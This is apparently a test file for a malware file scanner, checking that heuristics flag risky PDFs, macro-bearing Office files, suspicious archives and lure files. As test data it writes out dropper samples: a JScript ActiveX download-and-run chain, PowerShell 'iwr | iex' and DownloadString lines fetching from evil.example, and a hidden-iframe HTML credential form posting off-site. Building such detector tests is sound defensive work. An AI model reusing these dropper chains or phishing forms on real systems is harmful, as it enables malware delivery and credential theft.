import fs from "fs/promises";
import os from "os";
import path from "path";
import { afterEach, describe, expect, it } from "vitest";
import { scanUploadedFile } from "../src/scanner/fileScanner.js";

const tempRoots = [];

async function createTempFile(fileName, content) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "virovanta-type-heuristics-test-"));
  const filePath = path.join(root, fileName);
  tempRoots.push(root);
  await fs.writeFile(filePath, content);
  return filePath;
}

function buildZipLikeBuffer(entryNames, extraText = "") {
  return Buffer.concat([
    Buffer.from([0x50, 0x4b, 0x03, 0x04]),
    Buffer.from(`\n${entryNames.join("\n")}\n${extraText}`, "utf8")
  ]);
}

function buildOleLikeBuffer(text = "") {
  return Buffer.concat([
    Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
    Buffer.from(`\n${text}`, "utf8")
  ]);
}

function buildLnkLikeBuffer(utf16Text = "") {
  return Buffer.concat([
    Buffer.from([
      0x4c, 0x00, 0x00, 0x00,
      0x01, 0x14, 0x02, 0x00,
      0x00, 0x00, 0x00, 0x00,
      0xc0, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x46
    ]),
    Buffer.from(utf16Text, "utf16le")
  ]);
}

afterEach(async () => {
  const roots = tempRoots.splice(0);
  await Promise.all(roots.map((root) => fs.rm(root, { recursive: true, force: true })));
});

describe("file scanner type-specific heuristics", () => {
  it("flags scripted or action-heavy PDFs", async () => {
    const filePath = await createTempFile(
      "invoice.pdf",
      Buffer.from('%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /Names << /JavaScript 3 0 R >> /Launch /EmbeddedFile >>\n')
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "invoice.pdf",
      declaredMimeType: "application/pdf"
    });

    expect(report.findings.some((finding) => finding.id === "pdf_active_content")).toBe(true);
    expect(report.findings.some((finding) => finding.id === "pdf_launch_or_rich_media")).toBe(true);
  });

  it("flags macro projects hidden in macro-free docx containers", async () => {
    const filePath = await createTempFile(
      "brief.docx",
      buildZipLikeBuffer(["[Content_Types].xml", "word/document.xml", "word/vbaProject.bin"])
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "brief.docx",
      declaredMimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    });

    expect(report.findings.some((finding) => finding.id === "ooxml_macro_project")).toBe(true);
    expect(["unknown", "suspicious", "malicious"]).toContain(report.verdict);
  });

  it("flags legacy office containers with embedded object indicators", async () => {
    const filePath = await createTempFile(
      "ledger.xls",
      buildOleLikeBuffer("Workbook Ole10Native ObjectPool VBA Macros")
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "ledger.xls",
      declaredMimeType: "application/vnd.ms-excel"
    });

    expect(report.findings.some((finding) => finding.id === "legacy_office_embedded_content")).toBe(true);
  });

  it("flags xlsx packages with external relationships", async () => {
    const filePath = await createTempFile(
      "finance.xlsx",
      buildZipLikeBuffer(["[Content_Types].xml", "xl/workbook.xml", "xl/externalLinks/externalLink1.xml", "xl/_rels/workbook.xml.rels"])
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "finance.xlsx",
      declaredMimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    });

    expect(report.findings.some((finding) => finding.id === "ooxml_external_relationships")).toBe(true);
  });

  it("flags risky payload naming inside zip archives", async () => {
    const filePath = await createTempFile(
      "archive.zip",
      buildZipLikeBuffer(["invoice.pdf.exe", "openme.lnk", "stage.js"])
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "archive.zip",
      declaredMimeType: "application/zip"
    });

    expect(report.findings.some((finding) => finding.id === "archive_risky_payloads")).toBe(true);
    expect(report.findings.some((finding) => finding.id === "archive_double_extension_payload")).toBe(true);
    expect(report.findings.some((finding) => finding.id === "archive_shortcut_dropper_chain")).toBe(true);
  });

  it("flags JavaScript droppers using ActiveX download-and-run chains", async () => {
    const filePath = await createTempFile(
      "dropper.js",
      Buffer.from(
        'var sh=new ActiveXObject("WScript.Shell"); var x=new ActiveXObject("MSXML2.XMLHTTP"); var s=new ActiveXObject("ADODB.Stream"); x.open("GET","http://evil.example/payload",false); s.SaveToFile("payload.exe"); sh.Run("payload.exe");'
      )
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "dropper.js",
      declaredMimeType: "application/javascript"
    });

    expect(report.findings.some((finding) => finding.id === "javascript_dropper_chain")).toBe(true);
  });

  it("flags PowerShell download-and-execute chains", async () => {
    const filePath = await createTempFile(
      "stage.ps1",
      Buffer.from('Start-BitsTransfer -Source "https://evil.example/a.ps1" -Destination "$env:TEMP\\a.ps1"; Invoke-Expression (New-Object Net.WebClient).DownloadString("https://evil.example/b.ps1"); powershell.exe -ExecutionPolicy Bypass')
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "stage.ps1",
      declaredMimeType: "text/plain"
    });

    expect(report.findings.some((finding) => finding.id === "powershell_dropper_chain")).toBe(true);
    expect(report.findings.some((finding) => finding.id === "powershell_evasion_features")).toBe(true);
  });

  it("flags weaponized LNK and HTML lure traits", async () => {
    const lnkPath = await createTempFile(
      "claim.lnk",
      buildLnkLikeBuffer('powershell.exe -w hidden -c iwr https://evil.example/stage.ps1 | iex \\\\server\\dropper')
    );
    const htmlPath = await createTempFile(
      "login.html",
      Buffer.from('<html><head><meta http-equiv="refresh" content="0;url=https://evil.example"></head><body><iframe style="display:none" src="https://evil.example/frame"></iframe><form action="https://evil.example/post"><input type="email"><input type="password"></form></body></html>')
    );

    const [lnkReport, htmlReport] = await Promise.all([
      scanUploadedFile({
        filePath: lnkPath,
        originalName: "claim.lnk",
        declaredMimeType: "application/octet-stream"
      }),
      scanUploadedFile({
        filePath: htmlPath,
        originalName: "login.html",
        declaredMimeType: "text/html"
      })
    ]);

    expect(lnkReport.findings.some((finding) => finding.id === "lnk_script_interpreter")).toBe(true);
    expect(lnkReport.findings.some((finding) => finding.id === "lnk_remote_target")).toBe(true);
    expect(htmlReport.findings.some((finding) => finding.id === "html_meta_refresh_redirect")).toBe(true);
    expect(htmlReport.findings.some((finding) => finding.id === "html_hidden_frame")).toBe(true);
    expect(htmlReport.findings.some((finding) => finding.id === "html_external_credential_form")).toBe(true);
  });
});

